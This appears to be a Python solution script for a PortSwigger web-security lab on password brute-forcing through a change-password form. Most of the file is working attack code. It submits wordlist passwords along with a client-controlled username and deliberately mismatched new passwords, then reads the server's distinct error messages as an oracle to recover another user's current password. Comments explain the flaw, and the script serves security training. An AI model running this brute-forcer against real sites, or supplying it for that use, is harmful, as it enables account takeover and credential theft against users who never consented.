# Lab 12 — Password brute-force via password change
# PortSwigger: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change
#
# Vulnerability: The password change form accepts a client-controlled
#                'username' parameter, and returns a distinguishable error
#                depending on whether the CURRENT password was correct —
#                even when username != the logged-in user
# Aim:           Brute-force carlos's current password via the change-password
#                endpoint, without ever needing to log in as him
#
# Technique:
#   Submit deliberately MISMATCHED new passwords (so nothing actually changes)
#   along with a candidate current-password and username=carlos:
#     current-password WRONG  → "Current password is incorrect"
#     current-password RIGHT  → "New passwords do not match"  ← our signal
#
# Usage: python authentication_lab12.py <url> <passwords_file>

import sys
import urllib3
from proxies import proxies
from authentication_utils import (banner, section, make_session, login,
                                   get_csrf_from_response, load_wordlist, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

WRONG_PASSWORD_SIGNAL = "Current password is incorrect"
MISMATCH_SIGNAL       = "New passwords do not match"


def brute_force_current_password(session, url, target_username, passwords):
    print(f"  ➜  Testing {len(passwords)} candidates for {target_username}'s current password...\n")

    for i, candidate in enumerate(passwords, 1):
        account_page = session.get(f"{url}/my-account")
        csrf = get_csrf_from_response(account_page.text)

        data = {
            "username": target_username,       # client-controlled — target ANY user
            "current-password": candidate,
            "new-password-1": "newpass1xxxxx",  # deliberately mismatched
            "new-password-2": "newpass2yyyyy",  # so nothing actually changes
        }
        if csrf:
            data["csrf"] = csrf

        r = session.post(f"{url}/my-account/change-password", data=data, allow_redirects=True)

        if MISMATCH_SIGNAL in r.text:
            print(f"  ✔  Current password found: {candidate!r}")
            print(f"     (server said 'New passwords do not match' — meaning the")
            print(f"      CURRENT password was accepted as correct)")
            return candidate

        if i % 50 == 0:
            print(f"  ·  {i}/{len(passwords)} tried...")

    return None


if __name__ == "__main__":
    banner()
    section("LAB 12 — PASSWORD BRUTE-FORCE VIA PASSWORD CHANGE")

    if len(sys.argv) != 3:
        print("  Usage: python authentication_lab12.py <url> <passwords_file>")
        sys.exit(1)

    url, pfile = sys.argv[1], sys.argv[2]
    session = make_session(proxies)

    # ── Step 1: log in as wiener (any valid account works — the flaw is that
    #             the endpoint trusts the username FIELD, not the session) ──
    print("\n  ── Step 1: log in as wiener (any authenticated session works)\n")
    if not login(session, url):
        sys.exit(1)

    passwords = load_wordlist(pfile)
    if not passwords:
        sys.exit(1)

    section("Step 2: Brute-force carlos's current password")
    valid_pass = brute_force_current_password(session, url, "carlos", passwords)

    if not valid_pass:
        print("  ✘  No valid current password found in wordlist")
        sys.exit(1)

    print_box("CREDENTIALS FOUND", f"Username: carlos\nCurrent password: {valid_pass}")
    print("  ➜  Log in as carlos using this password.")
    print()
    print("  ℹ  The form was designed for a user to change THEIR OWN password,")
    print("     but the client-controlled 'username' field turned it into a")
    print("     universal password oracle for any account.")
